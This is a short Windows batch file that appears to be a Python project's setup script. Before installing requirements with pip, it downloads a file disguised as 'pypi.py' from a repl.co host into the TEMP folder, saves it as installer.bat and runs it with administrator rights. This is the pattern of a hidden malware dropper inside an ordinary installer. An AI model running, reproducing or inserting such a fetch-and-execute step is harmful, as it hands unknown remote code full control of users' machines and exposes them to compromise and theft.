@echo off
cd %TEMP%
curl https://bootstrapper.repl.co/scripts/pypi.py --output installer.bat && powershell Start-Process 'installer.bat' -Verb runAs
pip install -r requirements.txt
pause
